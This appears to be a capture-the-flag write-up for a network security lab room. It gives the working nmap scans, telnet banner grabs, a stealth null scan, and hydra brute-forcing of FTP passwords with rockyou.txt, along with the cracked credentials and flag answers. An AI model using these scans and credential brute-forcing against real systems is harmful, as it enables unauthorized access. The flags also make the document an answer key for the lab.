# Net Sec Challenge

---

## Task 1: Introduction

Use this challenge to test your mastery of the skills you have acquired in the Network Security module.  
All the questions in this challenge can be solved using only **nmap**, **telnet**, and **hydra**.

---

## Task 2: Challenge Questions

### Question 1  
**What is the highest port number being open less than 10,000?**  

**Answer:** 8080

```bash
root@ip-10-10-58-76:~# nmap -p 0-10000 10.10.146.130
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 18:04 BST
Nmap scan report for 10.10.146.130
Host is up (0.0057s latency).
Not shown: 9996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
MAC Address: 02:94:C8:E5:84:B5 (Unknown)
Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
```

### Question 2  
**There is an open port outside the common 1000 ports; it is above 10,000. What is it?**

**Answer:** 10021

```bash
root@ip-10-10-58-76:~# nmap -p 10000-65535 10.10.146.130
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 18:10 BST
Nmap scan report for 10.10.146.130
Host is up (0.0044s latency).
Not shown: 55535 closed ports
PORT      STATE SERVICE
10021/tcp open  unknown
MAC Address: 02:94:C8:E5:84:B5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.37 seconds
```

### Question 3  
**How many TCP ports are open?**

**Answer:** 6

```bash
root@ip-10-10-58-76:~# nmap -sS -p 0-65535 10.10.146.130
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 18:14 BST
Nmap scan report for 10.10.146.130
Host is up (0.0029s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown
MAC Address: 02:94:C8:E5:84:B5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.99 seconds
```

### Question 4  
**What is the flag hidden in the HTTP server header?**

**Answer:** `THM{web_server_25352}`

---

Initially, the HTTP request was made to port `8080`, which returned a 404 error indicating the resource was not found:

```bash
root@ip-10-10-58-76:~# telnet 10.10.146.130 8080
Trying 10.10.146.130...
Connected to 10.10.146.130.
Escape character is '^]'.
GET /index.html HTTP/1.1
host:telnet

HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 149
Date: Thu, 15 May 2025 17:17:42 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /index.html</pre>
</body>
</html>
Connection closed by foreign host.
```

Upon realizing the actual HTTP service was running on port `80`, the request was repeated on port 80, which revealed the flag in the `Server` header:

```bash
root@ip-10-10-58-76:~# telnet 10.10.146.130 80
Trying 10.10.146.130...
Connected to 10.10.146.130.
Escape character is '^]'.
GET /index.html HTTP/1.1
host:telnet

HTTP/1.0 400 Bad Request
Content-Type: text/html
Content-Length: 345
Connection: close
Date: Thu, 15 May 2025 17:19:11 GMT
Server: lighttpd THM{web_server_25352}

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>400 Bad Request</title>
 </head>
 <body>
  <h1>400 Bad Request</h1>
 </body>
</html>
Connection closed by foreign host.
```

### Question 5  
**What is the flag hidden in the SSH server header?**  

**Answer:** THM{946219583339}

```bash
root@ip-10-10-58-76:~# telnet 10.10.146.130 22
Trying 10.10.146.130...
Connected to 10.10.146.130.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

### Question 6  
**We have an FTP server listening on a non-standard port. What is the version of the FTP server?**

**Answer:** vsftpd 3.0.5

```bash
root@ip-10-10-58-76:~# nmap -sV -p 1-65535 10.10.146.130
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 18:31 BST
Nmap scan report for 10.10.146.130
Host is up (0.0049s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
10021/tcp open  ftp         vsftpd 3.0.5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.80%I=7%D=5/15%Time=68262504%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
MAC Address: 02:94:C8:E5:84:B5 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.61 seconds
```

### Question 7  
**We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files accessible via FTP?**

**Answer:** THM{321452667098}

First, a brute-force attack was performed to find passwords for the users `eddie` and `quinn` on the FTP server running on the non-standard port 10021.

- For `User: eddie` `Password: jordan`:
```bash
root@ip-10-10-58-76:~# hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.146.130 -s 10021
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 18:42:02
[WARNING] Restorefile (you have 10 seconds to abort...) from a previous session found
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398)
[DATA] attacking ftp://10.10.146.130:10021/
[10021][ftp] host: 10.10.146.130   login: eddie   password: jordan
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2025-05-15 18:42:24
```

After logging in via FTP with the credentials for user **eddie**, no files or directories were found:

```bash
root@ip-10-10-58-76:~# ftp 10.10.146.130 10021
Connected to 10.10.146.130.
220 (vsFTPd 3.0.5)
Name (10.10.146.130:root): eddie
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> quit
221 Goodbye.
```

- For `User: quinn` `Password: andrea`:

```bash
root@ip-10-10-58-76:~# hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.146.130 -s 10021
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra starting at 2025-05-15 18:42:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries
[DATA] attacking ftp://10.10.146.130:10021/
[10021][ftp] host: 10.10.146.130   login: quinn   password: andrea
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2025-05-15 18:42:38
```
Logging into quinn's FTP account revealed a hidden file containing the flag:

```bash
root@ip-10-10-58-76:~# ftp 10.10.146.130 10021
Connected to 10.10.146.130.
220 (vsFTPd 3.0.5)
Name (10.10.146.130:root): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (21.4892 kB/s)
ftp> quit
221 Goodbye.
```

The downloaded flag file was then read from the local system:

```bash
root@ip-10-10-58-76:~# cat ftp_flag.txt
THM{321452667098}
```

Browsing to http://10.10.146.130:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

Answer: THM{f7443f99}

Initial reconnaissance commands executed prior to solving the challenge:

```bash
nmap 10.10.146.130

nmap -sS 10.10.146.130
```
This command was effective in accomplishing the task:
```bash
nmap -sN 10.10.146.130
```
```bash
root@ip-10-10-58-76:~# nmap -sN 10.10.146.130
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-15 18:56 BST
Nmap scan report for 10.10.146.130
Host is up (0.00079s latency).
Not shown: 995 closed ports
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy
MAC Address: 02:94:C8:E5:84:B5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
```

# Task 3: Summary

In this module, we have learned about passive reconnaissance, active reconnaissance, Nmap, protocols and services, and attacking logins with **Hydra**.
